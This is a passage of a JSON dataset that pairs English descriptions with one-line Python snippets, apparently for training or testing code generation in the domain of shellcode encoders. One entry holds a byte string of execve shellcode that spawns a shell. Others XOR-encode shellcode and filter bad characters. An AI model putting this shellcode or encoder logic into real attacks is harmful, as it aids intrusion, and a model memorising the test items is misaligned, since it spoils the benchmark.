    "snippet": "encoded2P2 += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "encoded2P2": "var1"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "encoded2P2 is string \"\"",
    "rewritten_intent": "encoded2P2 is string \"\"",
    "snippet": "encoded2P2 = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "encoded2P2": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "append string '\\\\x' to encodedP2",
    "rewritten_intent": "append string '\\\\x' to encodedP2",
    "snippet": "encodedP2 += '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0",
      "encodedP2": "var1"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "convert the value x to hex and append it to the string encodedP2",
    "rewritten_intent": "convert the value x to hex and append it to the string encodedP2",
    "snippet": "encodedP2 += '%02x' % x",
    "slot_map": {
      "encodedP2": "var0"
    },
    "intent_tokens": [
      "convert",
      "value",
      "x",
      "to",
      "hex",
      "and",
      "append",
      "it",
      "to",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "encodedP2 is string \"\"",
    "rewritten_intent": "encodedP2 is string \"\"",
    "snippet": "encodedP2 = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "encodedP2": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "end is a string \"\\\\xaa\"",
    "rewritten_intent": "end is a string \"\\\\xaa\"",
    "snippet": "end = \"\\\\xaa\"",
    "slot_map": {
      "\"\\\\xaa\"": "var0"
    },
    "intent_tokens": [
      "end",
      "is",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "end",
      "=",
      "``",
      "\\\\xaa",
      "''"
    ]
  },
  {
    "intent": "declare an except statement",
    "rewritten_intent": "declare an except statement",
    "snippet": "except:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "except",
      "statement"
    ],
    "snippet_tokens": [
      "except",
      ":"
    ]
  },
  {
    "intent": "execve_shellcode is a bytearrary of the byte string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\"",
    "rewritten_intent": "execve_shellcode is a bytearrary of the byte string \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\"",
    "snippet": "execve_shellcode = bytearray(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\")",
    "slot_map": {
      "\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x87\\xe3\\xb0\\x0b\\xcd\\x80\"": "var2",
      "execve_shellcode": "var0",
      "bytearrary": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "var1",
      "of",
      "byte",
      "string",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "bytearray",
      "(",
      "bvar2",
      ")"
    ]
  },
  {
    "intent": "execve_shellcode is a bytearray of execve_shellcode",
    "rewritten_intent": "execve_shellcode is a bytearray of execve_shellcode",
    "snippet": "execve_shellcode = bytearray(execve_shellcode)",
    "slot_map": {
      "execve_shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "var0",
      "is",
      "var1",
      "of",
      "execve_shellcode"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1",
      "(",
      "var0",
      ")"
    ]
  },
  {
    "intent": "append 0x90 to execve_shellcode",
    "rewritten_intent": "append 0x90 to execve_shellcode",
    "snippet": "execve_shellcode.append(0x90)",
    "slot_map": {
      "execve_shellcode": "var1",
      "0x90": "var0"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1.append",
      "(",
      "var0",
      ")"
    ]
  },
  {
    "intent": "exit with 1",
    "rewritten_intent": "exit with 1",
    "snippet": "exit(1)",
    "slot_map": {},
    "intent_tokens": [
      "exit",
      "with",
      "1"
    ],
    "snippet_tokens": [
      "exit",
      "(",
      "1",
      ")"
    ]
  },
  {
    "intent": "terminate the program with exit code 1",
    "rewritten_intent": "terminate the program with exit code 1",
    "snippet": "exit(1)",
    "slot_map": {},
    "intent_tokens": [
      "terminate",
      "program",
      "with",
      "exit",
      "code",
      "1"
    ],
    "snippet_tokens": [
      "exit",
      "(",
      "1",
      ")"
    ]
  },
  {
    "intent": "terminate the program with exit code 2",
    "rewritten_intent": "terminate the program with exit code 2",
    "snippet": "exit(2)",
    "slot_map": {},
    "intent_tokens": [
      "terminate",
      "program",
      "with",
      "exit",
      "code",
      "2"
    ],
    "snippet_tokens": [
      "exit",
      "(",
      "2",
      ")"
    ]
  },
  {
    "intent": "terminate the program with exit code 3",
    "rewritten_intent": "terminate the program with exit code 3",
    "snippet": "exit(3)",
    "slot_map": {},
    "intent_tokens": [
      "terminate",
      "program",
      "with",
      "exit",
      "code",
      "3"
    ],
    "snippet_tokens": [
      "exit",
      "(",
      "3",
      ")"
    ]
  },
  {
    "intent": "Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb",
    "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb",
    "snippet": "fb = int(hex(leader)[2:3],16)",
    "slot_map": {
      "indicies": "var0",
      "int16": "var1",
      "fb": "var2"
    },
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "leader",
      "to",
      "hexadecimal",
      ",",
      "then",
      "slice",
      "it",
      "between",
      "var0",
      "2",
      "and",
      "3",
      ",",
      "convert",
      "it",
      "to",
      "var1",
      "and",
      "add",
      "its",
      "value",
      "to",
      "variable",
      "var2"
    ],
    "snippet_tokens": [
      "var2",
      "=",
      "int",
      "(",
      "hex",
      "(",
      "leader",
      ")",
      "[",
      "2:3",
      "]",
      ",",
      "16",
      ")"
    ]
  },
  {
    "intent": "concatenate in the string final_shellcode the concatenation of '\\\\x' and the string byte encoded in hexadecimal",
    "rewritten_intent": "concatenate in the string final_shellcode the concatenation of '\\\\x' and the string byte encoded in hexadecimal",
    "snippet": "final_shellcode += '\\\\x' + byte.encode('hex')",
    "slot_map": {
      "'\\\\x'": "var2",
      "final_shellcode": "var0"
    },
    "intent_tokens": [
      "concatenate",
      "in",
      "string",
      "var0",
      "concatenation",
      "of",
      "var2",
      "and",
      "string",
      "byte",
      "encoded",
      "in",
      "hexadecimal"
    ],
    "snippet_tokens": [
      "var0",
      "+=",
      "var2",
      "+",
      "byte.encode",
      "(",
      "'hex",
      "'",
      ")"
    ]
  },
  {
    "intent": "iterate bad_byte in bad_chars",
    "rewritten_intent": "iterate bad_byte in bad_chars",
    "snippet": "for bad_byte in bad_chars:",
    "slot_map": {
      "bad_byte": "var0",
      "bad_chars": "var1"
    },
    "intent_tokens": [
      "iterate",
      "var0",
      "in",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "var0",
      "in",
      "var1",
      ":"
    ]
  },
  {
    "intent": "iterate bytes in list bad_chars",
    "rewritten_intent": "iterate bytes in list bad_chars",
    "snippet": "for byte in bad_chars:",
    "slot_map": {
      "bad_chars": "var0"
    },
    "intent_tokens": [
      "iterate",
      "bytes",
      "in",
      "list",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "byte",
      "in",
      "var0",
      ":"
    ]
  },
  {
    "intent": "iterate byte in the list bytes",
    "rewritten_intent": "iterate byte in the list bytes",
    "snippet": "for byte in bytes:",
    "slot_map": {},
    "intent_tokens": [
      "iterate",
      "byte",
      "in",
      "list",
      "bytes"
    ],
    "snippet_tokens": [
      "for",
      "byte",
      "in",
      "bytes",
      ":"
    ]
  },
  {
    "intent": "iterate byte in decoder_stub",
    "rewritten_intent": "iterate byte in decoder_stub",
    "snippet": "for byte in decoder_stub:",
    "slot_map": {
      "decoder_stub": "var0"
    },
    "intent_tokens": [
      "iterate",
      "byte",
      "in",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "byte",
      "in",
      "var0",
      ":"
    ]
  },
  {
    "intent": "iterate over bytes in decoder_stub",
    "rewritten_intent": "iterate over bytes in decoder_stub",
    "snippet": "for byte in decoder_stub:",
    "slot_map": {
      "decoder_stub": "var0"
    },
    "intent_tokens": [
      "iterate",
      "over",
      "bytes",
      "in",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "byte",
      "in",
      "var0",
      ":"
    ]
  },
  {
    "intent": "iterate over bytes in encoder",
    "rewritten_intent": "iterate over bytes in encoder",
    "snippet": "for byte in encoder:",
    "slot_map": {
      "encoder": "var0"
    },
    "intent_tokens": [
      "iterate",
      "over",
      "bytes",
      "in",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "byte",
      "in",
      "var0",
      ":"
    ]
  },
  {
    "intent": "iterate char over bad_chars",
    "rewritten_intent": "iterate char over bad_chars",
    "snippet": "for char in bad_chars:",
    "slot_map": {
      "bad_chars": "var0"
    },
    "intent_tokens": [
      "iterate",
      "char",
      "over",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "char",
      "in",
      "var0",
      ":"
    ]
  },
  {
    "intent": "loop through shellcode converted into a bytearray",
    "rewritten_intent": "loop through shellcode converted into a bytearray",
    "snippet": "for i in bytearray(shellcode):",
    "slot_map": {
      "shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "loop",
      "through",
      "var0",
      "converted",
      "into",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "var1",
      "(",
      "var0",
      ")",
      ":"
    ]
  },
  {
    "intent": "Make a for loop for each i in the bytearray of shellcode",
    "rewritten_intent": "Make a for loop for each i in the bytearray of shellcode",
    "snippet": "for i in bytearray(shellcode):",
    "slot_map": {
      "bytearray": "var0",
      "shellcode": "var1"
    },
    "intent_tokens": [
      "Make",
      "for",
      "loop",
      "for",
      "each",
      "i",
      "in",
      "var0",
      "of",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "var0",
      "(",
      "var1",
      ")",
      ":"
    ]
  },
  {
    "intent": "loop over execve_shellcode",
    "rewritten_intent": "loop over execve_shellcode",
    "snippet": "for i in execve_shellcode:",
    "slot_map": {
      "execve_shellcode": "var0"
    },
    "intent_tokens": [
      "loop",
      "over",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "var0",
      ":"
    ]
  },
  {
    "intent": "iterate i over 255 random numbers between 1 and 256",
    "rewritten_intent": "iterate i over 255 random numbers between 1 and 256",
    "snippet": "for i in random.sample(range(1, 256), 255):",
    "slot_map": {},
    "intent_tokens": [
      "iterate",
      "i",
      "over",
      "255",
      "random",
      "numbers",
      "between",
      "1",
      "and",
      "256"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "random.sample",
      "(",
      "range",
      "(",
      "1",
      ",",
      "256",
      ")",
      ",",
      "255",
      ")",
      ":"
    ]
  },
  {
    "intent": "iterate i over a sequence of number from 0 to 2",
    "rewritten_intent": "iterate i over a sequence of number from 0 to 2",
    "snippet": "for i in range(0, 2):",
    "slot_map": {},
    "intent_tokens": [
      "iterate",
      "i",
      "over",
      "sequence",
      "of",
      "number",
      "from",
      "0",
      "to",
      "2"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "range",
      "(",
      "0",
      ",",
      "2",
      ")",
      ":"
    ]
  },
  {
    "intent": "initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 4",
    "rewritten_intent": "initialize a for loop with an iterator i with a range starting from 0 until the length of shellcode_original with a step of 4",
    "snippet": "for i in range(0, len(shellcode_original), 4):",
    "slot_map": {
      "shellcode_original": "var2",
      "iterator": "var0",
      "until": "var1"
    },
    "intent_tokens": [
      "initialize",
      "for",
      "loop",
      "with",
      "var0",
      "i",
      "with",
      "range",
      "starting",
      "from",
      "0",
      "var1",
      "length",
      "of",
      "var2",
      "with",
      "step",
      "of",
      "4"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "range",
      "(",
      "0",
      ",",
      "len",
      "(",
      "var2",
      ")",
      ",",
      "4",
      ")",
      ":"
    ]
  },
  {
    "intent": "initialize a for loop with an iterator i with a range starting from 0 until the value of padding",
    "rewritten_intent": "initialize a for loop with an iterator i with a range starting from 0 until the value of padding",
    "snippet": "for i in range(0, padding):",
    "slot_map": {
      "iterator": "var0",
      "until": "var1"
    },
    "intent_tokens": [
      "initialize",
      "for",
      "loop",
      "with",
      "var0",
      "i",
      "with",
      "range",
      "starting",
      "from",
      "0",
      "var1",
      "value",
      "of",
      "padding"
    ],
    "snippet_tokens": [
      "for",
      "i",
      "in",
      "range",
      "(",
      "0",
      ",",
      "padding",
      ")",
      ":"
    ]
  },
  {
    "intent": "Make a for loop for each x in the bytearray of buf",
    "rewritten_intent": "Make a for loop for each x in the bytearray of buf",
    "snippet": "for x in bytearray(buf) :",
    "slot_map": {
      "bytearray": "var0",
      "buf": "var1"
    },
    "intent_tokens": [
      "Make",
      "for",
      "loop",
      "for",
      "each",
      "x",
      "in",
      "var0",
      "of",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "var0",
      "(",
      "var1",
      ")",
      ":"
    ]
  },
  {
    "intent": "loop through shellcode converted into a bytearray",
    "rewritten_intent": "loop through shellcode converted into a bytearray",
    "snippet": "for x in bytearray(shellcode) :",
    "slot_map": {
      "shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "loop",
      "through",
      "var0",
      "converted",
      "into",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "var1",
      "(",
      "var0",
      ")",
      ":"
    ]
  },
  {
    "intent": "loop x over the bytearray of the string shellcode",
    "rewritten_intent": "loop x over the bytearray of the string shellcode",
    "snippet": "for x in bytearray(shellcode) :",
    "slot_map": {
      "bytearray": "var0",
      "shellcode": "var1"
    },
    "intent_tokens": [
      "loop",
      "x",
      "over",
      "var0",
      "of",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "var0",
      "(",
      "var1",
      ")",
      ":"
    ]
  },
  {
    "intent": "iterate x over the array of bytes of the string shellcode",
    "rewritten_intent": "iterate x over the array of bytes of the string shellcode",
    "snippet": "for x in bytearray(shellcode) :",
    "slot_map": {
      "shellcode": "var0"
    },
    "intent_tokens": [
      "iterate",
      "x",
      "over",
      "array",
      "of",
      "bytes",
      "of",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "bytearray",
      "(",
      "var0",
      ")",
      ":"
    ]
  },
  {
    "intent": "loop through shellcode converted into a bytearray",
    "rewritten_intent": "loop through shellcode converted into a bytearray",
    "snippet": "for x in bytearray(shellcode):",
    "slot_map": {
      "shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "loop",
      "through",
      "var0",
      "converted",
      "into",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "var1",
      "(",
      "var0",
      ")",
      ":"
    ]
  },
  {
    "intent": "Make a for loop for each x in the bytearray of shellcode",
    "rewritten_intent": "Make a for loop for each x in the bytearray of shellcode",
    "snippet": "for x in bytearray(shellcode):",
    "slot_map": {
      "bytearray": "var0",
      "shellcode": "var1"
    },
    "intent_tokens": [
      "Make",
      "for",
      "loop",
      "for",
      "each",
      "x",
      "in",
      "var0",
      "of",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "var0",
      "(",
      "var1",
      ")",
      ":"
    ]
  },
  {
    "intent": "declare a for loop with an iterator x for each element in shellcode starting from index 2 converted into a bytearray",
    "rewritten_intent": "declare a for loop with an iterator x for each element in shellcode starting from index 2 converted into a bytearray",
    "snippet": "for x in bytearray(shellcode)[2:]:",
    "slot_map": {
      "iterator": "var0",
      "shellcode": "var1",
      "bytearray": "var2"
    },
    "intent_tokens": [
      "declare",
      "for",
      "loop",
      "with",
      "var0",
      "x",
      "for",
      "each",
      "element",
      "in",
      "var1",
      "starting",
      "from",
      "index",
      "2",
      "converted",
      "into",
      "var2"
    ],
    "snippet_tokens": [
      "for",
      "x",
      "in",
      "var2",
      "(",
      "var1",
      ")",
      "[",
      "2",
      ":",
      "]",
      ":"
    ]
  },
  {
    "intent": "loop through shellcode converted into a bytearray",
    "rewritten_intent": "loop through shellcode converted into a bytearray",
    "snippet": "for y in bytearray(shellcode):",
    "slot_map": {
      "shellcode": "var0",
      "bytearray": "var1"
    },
    "intent_tokens": [
      "loop",
      "through",
      "var0",
      "converted",
      "into",
      "var1"
    ],
    "snippet_tokens": [
      "for",
      "y",
      "in",
      "var1",
      "(",
      "var0",
      ")",
      ":"
    ]
  },
  {
    "intent": "concatenate '0x' to the string format_0x",
    "rewritten_intent": "concatenate '0x' to the string format_0x",
    "snippet": "format_0x += '0x'",
    "slot_map": {
      "'0x'": "var0",
      "format_0x": "var1"
    },
    "intent_tokens": [
      "concatenate",
      "var0",
      "to",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "append encoded_instruction_in_hex and string \",\" to format_0x",
    "rewritten_intent": "append encoded_instruction_in_hex and string \",\" to format_0x",
    "snippet": "format_0x += encoded_instruction_in_hex+\",\"",
    "slot_map": {
      "\",\"": "var2",
      "encoded_instruction_in_hex": "var0",
      "format_0x": "var3"
    },
    "intent_tokens": [
      "append",
      "var0",
      "and",
      "string",
      "var2",
      "to",
      "var3"
    ],
    "snippet_tokens": [
      "var3",
      "+=",
      "var0",
      "+",
      "'",
      ",",
      "'"
    ]
  },
  {
    "intent": "format_0x is a string \"\"",
    "rewritten_intent": "format_0x is a string \"\"",
    "snippet": "format_0x = \"\"",
    "slot_map": {
      "\"\"": "var0"
    },
    "intent_tokens": [
      "format_0x",
      "is",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "format_0x",
      "=",
      "var0"
    ]
  },
  {
    "intent": "format_slash_x is a string \"\"",
    "rewritten_intent": "format_slash_x is a string \"\"",
    "snippet": "format_slash_x = \"\"",
    "slot_map": {
      "\"\"": "var1",
      "format_slash_x": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var1"
    ]
  },
  {
    "intent": "h is the sum of y and rot modulo 256",
    "rewritten_intent": "h is the sum of y and rot modulo 256",
    "snippet": "h = (y + rot)%256",
    "slot_map": {
      "modulo": "var0"
    },
    "intent_tokens": [
      "h",
      "is",
      "sum",
      "of",
      "y",
      "and",
      "rot",
      "var0",
      "256"
    ],
    "snippet_tokens": [
      "h",
      "=",
      "(",
      "y",
      "+",
      "rot",
      ")",
      "%",
      "256"
    ]
  },
  {
    "intent": "Convert the variable x to a hexadecimal and store it in the variable hopcode",
    "rewritten_intent": "Convert the variable x to a hexadecimal and store it in the variable hopcode",
    "snippet": "hopcode = '%02x' %x",
    "slot_map": {
      "hopcode": "var0"
    },
    "intent_tokens": [
      "Convert",
      "variable",
      "x",
      "to",
      "hexadecimal",
      "and",
      "store",
      "it",
      "in",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "add 1 to the value of i",
    "rewritten_intent": "add 1 to the value of i",
    "snippet": "i += 1",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "1",
      "to",
      "value",
      "of",
      "i"
    ],
    "snippet_tokens": [
      "i",
      "+=",
      "1"
    ]
  },
  {
    "intent": "add 1 to the value of i",
    "rewritten_intent": "add 1 to the value of i",
    "snippet": "i +=1",
    "slot_map": {},
    "intent_tokens": [
      "add",
      "1",
      "to",
      "value",
      "of",
      "i"
    ],
    "snippet_tokens": [
      "i",
      "+=",
      "1"
    ]
  },
  {
    "intent": "set the variable i to 0",
    "rewritten_intent": "set the variable i to 0",
    "snippet": "i=0",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "variable",
      "i",
      "to",
      "0"
    ],
    "snippet_tokens": [
      "i",
      "=",
      "0"
    ]
  },
  {
    "intent": "if string \"0x0,\" is in format_0x",
    "rewritten_intent": "if string \"0x0,\" is in format_0x",
    "snippet": "if \"0x0,\" in format_0x:",
    "slot_map": {
      "\"0x0,\"": "var0",
      "format_0x": "var1"
    },
    "intent_tokens": [
      "if",
      "string",
      "var0",
      "is",
      "in",
      "var1"
    ],
    "snippet_tokens": [
      "if",
      "var0",
      "in",
      "var1",
      ":"
    ]
  },
  {
    "intent": "check if the length of execve_shellcode is not even",
    "rewritten_intent": "check if the length of execve_shellcode is not even",
    "snippet": "if (len(execve_shellcode)%2)!=0:",
    "slot_map": {
      "execve_shellcode": "var0"
    },
    "intent_tokens": [
      "check",
      "if",
      "length",
      "of",
      "var0",
      "is",
      "not",
      "even"
    ],
    "snippet_tokens": [
      "if",
      "(",
      "len",
      "(",
      "var0",
      ")",
      "%",
      "2",
      ")",
      "!",
      "=0",
      ":"
    ]
  },
  {
    "intent": "check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0",
    "rewritten_intent": "check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0",
    "snippet": "if (r ^ shellcode_original[i] != 0) and (r ^ shellcode_original[i+1] != 0) and (r ^ shellcode_original[i+2] != 0) and (r ^ shellcode_original[i+3] != 0):",
    "slot_map": {
      "shellcode_original": "var4",
      "bitwise": "var0",
      "i+1": "var8",
      "i+2": "var9",
      "i+3": "var10"
    },
    "intent_tokens": [
      "check",
      "if",
      "following",
      "expression",
      "is",
      "true",
      "r",
      "var0",
      "xor",
      "var4",
      "at",
      "index",
      "i",
      "is",
      "not",
      "equal",
      "to",
      "0",
      "and",
      "r",
      "var0",
      "xor",
      "var4",
      "at",
      "index",
      "var8",
      "does",
      "not",
      "equal",
      "0",
      "and",
      "r",
      "var0",
      "xor",
      "var4",
      "at",
      "index",
      "var9",
      "does",
      "not",
      "equal",
      "0",
      "and",
      "r",
      "var0",
      "xor",
      "var4",
      "at",
      "index",
      "var10",
      "does",
      "not",
      "equal",
      "0"
    ],
    "snippet_tokens": [
      "if",
      "(",
      "r",
      "^",
      "var4",
      "[",
      "i",
      "]",
      "!",
      "=",
      "0",
      ")",
      "and",
      "(",
      "r",
      "^",
      "var4",
      "[",
      "var8",
      "]",
      "!",
      "=",
      "0",
      ")",
      "and",
      "(",
      "r",
      "^",
      "var4",
      "[",
      "var9",
      "]",
      "!",
      "=",
      "0",
      ")",
      "and",
      "(",
      "r",
      "^",
      "var4",
      "[",
      "var10",
      "]",
      "!",
      "=",
      "0",
      ")",
      ":"
    ]
  },
  {
    "intent": "if char is equal to byte",
    "rewritten_intent": "if char is equal to byte",
    "snippet": "if char == byte:",
    "slot_map": {},
    "intent_tokens": [
      "if",
      "char",
      "is",
      "equal",
      "to",
      "byte"
    ],
    "snippet_tokens": [
      "if",
      "char",
      "==",
      "byte",
      ":"
    ]
  },
  {
    "intent": "if count modulo 2 is different from zero",
    "rewritten_intent": "if count modulo 2 is different from zero",
    "snippet": "if count % 2 != 0:",
    "slot_map": {
      "modulo": "var0"
    },
    "intent_tokens": [
      "if",
      "count",
      "var0",
      "2",
      "is",
      "different",
      "from",
      "zero"
    ],
    "snippet_tokens": [
      "if",
      "count",
      "%",
      "2",
      "!",
      "=",
      "0",
      ":"
    ]
  },
  {
    "intent": "if counter modulo 2 is equal to 0",
    "rewritten_intent": "if counter modulo 2 is equal to 0",
    "snippet": "if counter % 2 == 0 :",
    "slot_map": {
      "modulo": "var0"
    },
    "intent_tokens": [
      "if",
      "counter",
      "var0",
      "2",
      "is",
      "equal",
      "to",
      "0"
    ],
    "snippet_tokens": [
      "if",
      "counter",
      "%",
      "2",
      "==",
      "0",
      ":"
    ]
  },
  {
    "intent": "if i is lower than the length of chunk",
    "rewritten_intent": "if i is lower than the length of chunk",
    "snippet": "if i < len(chunk):",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "if",
      "i",
      "is",
      "lower",
      "var0",
      "length",
      "of",
      "chunk"
    ],
    "snippet_tokens": [
      "if",
      "i",
      "<",
      "len",
      "(",
      "chunk",
      ")",
      ":"
    ]
  },
  {
    "intent": "convert the string byte to hex, then cast the result to int16 and then check if it is equal to i",
    "rewritten_intent": "convert the string byte to hex, then cast the result to int16 and then check if it is equal to i",
    "snippet": "if i == int(byte.encode('hex'), 16):",
    "slot_map": {
      "int16": "var0"
    },
    "intent_tokens": [
      "convert",
      "string",
      "byte",
      "to",
      "hex",
      ",",
      "then",
      "cast",
      "result",
      "to",
      "var0",
      "and",
      "then",
      "check",
      "if",
      "it",
      "is",
      "equal",
      "to",
      "i"
    ],
    "snippet_tokens": [
      "if",
      "i",
      "==",
      "int",
      "(",
      "byte.encode",
      "(",
      "'hex",
      "'",
      ")",
      ",",
      "16",
      ")",
      ":"
    ]
  },
  {
    "intent": "convert to integer base 16 the string byte encoded to hex and check if it is equal to i",
    "rewritten_intent": "convert to integer base 16 the string byte encoded to hex and check if it is equal to i",
    "snippet": "if i == int(byte.encode('hex'), 16):",
    "slot_map": {},
    "intent_tokens": [
      "convert",
      "to",
      "integer",
      "base",
      "16",
      "string",
      "byte",
      "encoded",
      "to",
      "hex",
      "and",
      "check",
      "if",
      "it",
      "is",
      "equal",
      "to",
      "i"
    ],
    "snippet_tokens": [
      "if",
      "i",
      "==",
      "int",
      "(",
      "byte.encode",
      "(",
      "'hex",
      "'",
      ")",
      ",",
      "16",
      ")",
      ":"
    ]
  },
  {
    "intent": "if the length of shellcode_original is not divisable by 4",
    "rewritten_intent": "if the length of shellcode_original is not divisable by 4",
    "snippet": "if len(shellcode_original) % 4 != 0:",
    "slot_map": {
      "shellcode_original": "var0",
      "divisable": "var1"
    },
    "intent_tokens": [
      "if",
      "length",
      "of",
      "var0",
      "is",
      "not",
      "var1",
      "by",
      "4"
    ],
    "snippet_tokens": [
      "if",
      "len",
      "(",
      "var0",
      ")",
      "%",
      "4",
      "!",
      "=",
      "0",
      ":"
    ]
  },
  {
    "intent": "if the length of sys.argv is different from 3",
    "rewritten_intent": "if the length of sys.argv is different from 3",
    "snippet": "if len(sys.argv) != 3:",
    "slot_map": {
      "sys.argv": "var0"
    },
    "intent_tokens": [
      "if",
      "length",
      "of",
      "var0",
      "is",
      "different",
      "from",
      "3"
    ],
    "snippet_tokens": [
      "if",
      "len",
      "(",
      "var0",
      ")",
      "!",
      "=",
      "3",
      ":"
    ]
  },
  {
    "intent": "if the number of arguments is lower than 2",
    "rewritten_intent": "if the number of arguments is lower than 2",
    "snippet": "if len(sys.argv) < 2:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "if",
      "number",
      "of",
      "arguments",
      "is",
      "lower",
      "var0",
      "2"
    ],
    "snippet_tokens": [
      "if",
      "len",
      "(",
      "sys.argv",
      ")",
      "<",
      "2",
      ":"
    ]
  },
  {
    "intent": "check if the total number of command-line arguments are less than 2",
    "rewritten_intent": "check if the total number of command-line arguments are less than 2",
    "snippet": "if len(sys.argv) < 2:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "check",
      "if",
      "total",
      "number",
      "of",
      "command-line",
      "arguments",
      "are",
      "less",
      "var0",
      "2"
    ],
    "snippet_tokens": [
      "if",
      "len",
      "(",
      "sys.argv",
      ")",
      "<",
      "2",
      ":"
    ]
  },
  {
    "intent": "if the number of arguments is higher than 2",
    "rewritten_intent": "if the number of arguments is higher than 2",
    "snippet": "if len(sys.argv) > 2:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "if",
      "number",
      "of",
      "arguments",
      "is",
      "higher",
      "var0",
      "2"
    ],
    "snippet_tokens": [
      "if",
      "len",
      "(",
      "sys.argv",
      ")",
      ">",
      "2",
      ":"
    ]
  },
  {
    "intent": "Check if the length of xxx is greater than 4",
    "rewritten_intent": "Check if the length of xxx is greater than 4",
    "snippet": "if len(xxx)>4:",
    "slot_map": {
      "than": "var0"
    },
    "intent_tokens": [
      "Check",
      "if",
      "length",
      "of",
      "xxx",
      "is",
      "greater",
      "var0",
      "4"
    ],
    "snippet_tokens": [
      "if",
      "len",
      "(",
      "xxx",
      ")",
      ">",
      "4",
      ":"
    ]
  },
  {
    "intent": "if matched_a_byte is True",
    "rewritten_intent": "if matched_a_byte is True",
    "snippet": "if matched_a_byte:",
    "slot_map": {
      "True": "var2",
      "matched_a_byte": "var0"
    },
    "intent_tokens": [
      "if",
      "var0",
      "is",
      "var2"
    ],
    "snippet_tokens": [
      "if",
      "var0",
      ":"
    ]
  },
  {
    "intent": "check if n is greater or equals to 0",
    "rewritten_intent": "check if n is greater or equals to 0",
    "snippet": "if n >= 0:",
    "slot_map": {},
